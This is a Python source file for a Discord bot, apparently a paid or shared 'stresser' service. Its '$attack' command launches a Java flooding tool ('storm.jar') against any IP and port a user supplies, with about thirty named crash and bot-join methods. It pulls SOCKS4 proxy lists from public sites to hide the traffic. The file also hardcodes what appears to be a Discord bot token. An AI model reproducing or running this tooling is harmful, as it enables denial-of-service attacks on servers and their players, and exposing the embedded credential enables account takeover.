import asyncio
from os import system
from subprocess import Popen

import discord
from discord.ext import commands
from time import sleep

proxyMode = input('ProxyMode (s, u): ')

client = commands.Bot(command_prefix='$', help_command=None)
methods_all = ['join',
               'legitjoin',
               'localhost',
               'invaldnames',
               'longnames',
               'power',
               'spoof',
               'spam',
               'killer',
               'nullping',
               'charonbot',
               'packet',
               'queue',
               'sf',
               'ultimatesmasher',
               'nabcry',
               'colorcrasher',
               'yoonikscry',
               'nettydowner',
               'bigpacket',
               'network',
               'bighandshake',
               'randombytes',
               'botjoiner',
               'ping',
               'multikiller',
               'extremejoin',
               'spamjoin',
               'ram',
               'botnet']


def update():
    system('rm proxies.txt')
    system(
        'curl -o proxies-0.txt "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all"')
    system('curl -o proxies-1.txt "https://api.openproxylist.xyz/socks4.txt"')
    system('curl -o proxies-2.txt "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt"')
    system(
        'curl -o proxies-3.txt "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt"')
    f = open('proxies.txt', 'w+')
    f1 = open('proxies-0.txt', 'r')
    f2 = open('proxies-1.txt', 'r')
    f3 = open('proxies-2.txt', 'r')
    f4 = open('proxies-3.txt', 'r')
    f.write(f1.read() + f2.read() + f3.read() + f4.read())
    f.close()
    print('Proxy Updated')


if proxyMode == 's':
    pass
elif proxyMode == 'u':
    update()


@client.command(name='attack')
async def att_(ctx, ipport, prot, meth, time, cps, ):
    if ctx.channel.id == 990945754245902366:
        if meth in methods_all:
            if int(time) < 46:
                if int(open('slot.txt', 'r').readlines()[0]) < 2:
                    if int(open('slot.txt', 'r').readlines()[0]) == 1:
                        f = open('slot.txt', 'w')
                        f.write('2')
                        f.close()
                    if int(open('slot.txt', 'r').readlines()[0]) == 0:
                        f = open('slot.txt', 'w')
                        f.write('1')
                        f.close()
                    embed = discord.Embed(title='NCCorp')
                    embed.add_field(name='IP:Port', value=f'{ipport}', inline=False)
                    embed.add_field(name='Protocol', value=f'{prot}', inline=False)
                    embed.add_field(name='Method', value=f'{meth}', inline=False)
                    embed.add_field(name='Time', value=f'{time}', inline=False)
                    embed.add_field(name='Target CPS', value=f'{cps}', inline=False)
                    Popen(f'java -jar storm.jar {ipport} {prot} {meth} {time} {cps}', shell=True)
                    await ctx.send(embed=embed)
                    sleep(time)
                    if int(open('slot.txt', 'r').readlines()[0]) == 1:
                        f = open('slot.txt', 'w')
                        f.write('0')
                        f.close()
                    if int(open('slot.txt', 'r').readlines()[0]) == 2:
                        f = open('slot.txt', 'w')
                        f.write('1')
                        f.close()
                else:
                    await ctx.send("Слишком много отправленных атак!")
            else:
                await ctx.send("Максимум времяни атаки - 45 секунд!")
        else:
            await ctx.send("Неверный метод.")


async def on_ready():
    await asyncio.sleep(300)
    if proxyMode == 's':
        pass
    elif proxyMode == 'u':
        update()


client.run("OTkwOTc0NzAwODkxMDEzMjAx.GWHdk-.AT8tEE1a0JDddHiN_tUiDQDMpzcE9rz_hcaT8E")
